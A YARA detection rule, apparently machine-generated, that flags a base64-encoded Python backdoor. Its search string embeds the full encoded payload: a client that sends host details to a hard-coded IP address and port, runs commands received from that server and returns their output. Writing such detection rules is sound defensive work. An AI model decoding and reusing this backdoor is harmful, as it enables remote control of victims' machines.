rule Malicious_Base64_Backdoor {
    meta:
        author = "RuleLLM"
        description = "Detects base64-encoded backdoor communication mechanism"
        confidence = "90"
        severity = "80"
    
    strings:
        $base64_cmd = /aW1wb3J0IHBsYXRmb3JtCmltcG9ydCByZXF1ZXN0cwppbXBvcnQganNvbgppbXBvcnQgb3MKaW1wb3J0IHBzdXRpbAppbXBvcnQgdGltZQppbXBvcnQgdXVpZAoKZW5jcnlwdGlvbl9rZXkgPSAnVGhpc0lzQW5FbmNyeXB0ZWRNZXNzYWdlIScKY2xpZW50X2lkID0gc3RyKHV1aWQudXVpZDQoKSkKaXNfZXhpdCA9IEZhbHNlCnNsZWVwX3RpbWUgPSAzMAoKZGVmIHhvcl9lbmNyeXB0X2RlY3J5cHQobWVzc2FnZSwga2V5KToKICAgIHJldHVybiAnJy5qb2luKGNocihvcmQoYykgXiBvcmQoa2V5W2kgJSBsZW4oa2V5KV0pKSBmb3IgaSwgYyBpbiBlbnVtZXJhdGUobWVzc2FnZSkpCgpkZWYgZ2V0X3N5c3RlbV9pbmZvKCk6CiAgICByZXR1cm4gewogICAgICAgICJjbGllbnRfaWQiOiBjbGllbnRfaWQsCiAgICAgICAgInN5c3RlbSI6IHBsYXRmb3JtLnN5c3RlbSgpLAogICAgICAgICJwcm9jZXNzX25hbWUiOiBwc3V0aWwuUHJvY2Vzcyhvcy5nZXRwaWQoKSkubmFtZSgpLAogICAgICAgICJwcm9jZXNzX2lkIjogb3MuZ2V0cGlkKCkKICAgIH0KCmRlZiBjb21tdW5pY2F0ZV93aXRoX3NlcnZlcihzZXJ2ZXJfaXAsIHNlcnZlcl9wb3J0KToKICAgIGdsb2JhbCBpc19leGl0LCBzbGVlcF90aW1lCiAgICBzZXJ2ZXJfdXJsID0gZiJodHRwOi8ve3NlcnZlcl9pcH06e3NlcnZlcl9wb3J0fSIKICAgIHN5c3RlbV9pbmZvID0gZ2V0X3N5c3RlbV9pbmZvKCkKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgY2xpZW50X2RhdGEgPSB7ImNsaWVudF9pZCI6IGNsaWVudF9pZCwgInJlc3VsdCI6ICIifQogICAgICAgICAgICBlbmNyeXB0ZWRfZGF0YSA9IHhvcl9lbmNyeXB0X2RlY3J5cHQoanNvbi5kdW1wcyhzeXN0ZW1faW5mbyksIGVuY3J5cHRpb25fa2V5KQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3Qoc2VydmVyX3VybCwgZGF0YT1lbmNyeXB0ZWRfZGF0YSkKCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIGRlY3J5cHRlZF9yZXNwb25zZSA9IHhvcl9lbmNyeXB0X2RlY3J5cHQocmVzcG9uc2UudGV4dCwgZW5jcnlwdGlvbl9rZXkpCiAgICAgICAgICAgICAgICByZXNwb25zZV9kYXRhID0ganNvbi5sb2FkcyhkZWNyeXB0ZWRfcmVzcG9uc2UpCgogICAgICAgICAgICAgICAgY29tbWFuZCA9IHJlc3BvbnNlX2RhdGEuZ2V0KCJjb21tYW5kIiwgIiIpCiAgICAgICAgICAgICAgICBpZiBjb21tYW5kOgogICAgICAgICAgICAgICAgICAgIGNsaWVudF9kYXRhWyJjb21tYW5kIl0gPSBjb21tYW5kCiAgICAgICAgICAgICAgICAgICAgaWYgY29tbWFuZC5sb3dlcigpID09ICdleGl0JzoKICAgICAgICAgICAgICAgICAgICAgICAgaXNfZXhpdCA9IFRydWUKICAgICAgICAgICAgICAgICAgICBlbGlmIGNvbW1hbmQubG93ZXIoKS5zdGFydHN3aXRoKCdzbGVlcCcpOgogICAgICAgICAgICAgICAgICAgICAgICBfLCBzbGVlcF90aW1lID0gY29tbWFuZC5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICAgICAgICAgIHNsZWVwX3RpbWUgPSBpbnQoc2xlZXBfdGltZS5zdHJpcCgpKQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gIiIKICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSBvcy5wb3Blbihjb21tYW5kKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICBjbGllbnRfZGF0YVsicmVzdWx0Il0gPSByZXN1bHQKCiAgICAgICAgICAgICAgICAgICAgZW5jcnlwdGVkX2RhdGEgPSB4b3JfZW5jcnlwdF9kZWNyeXB0KGpzb24uZHVtcHMoY2xpZW50X2RhdGEpLCBlbmNyeXB0aW9uX2tleSkKICAgICAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KHNlcnZlcl91cmwsIGRataGE9ZW5jcnlwdGVkX2RhdGEpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwYXNzCiAgICAgICAgaWYgaXNfZXhpdDoKICAgICAgICAgICAgYnJlYWsKICAgICAgICB0aW1lLnNsZWVwKHNsZWVwX3RpbWUpCgpjb21tdW5pY2F0ZV93aXRoX3NlcnZlcihzZXJ2ZXJfaXA9IjM4LjU0LjU3LjQyIiwgc2VydmVyX3BvcnQ9NDU4OTIpCg==/
        $subprocess_popen = "subprocess.Popen"
        $base64_decode = "base64.b64decode"
    
    condition:
        all of them
}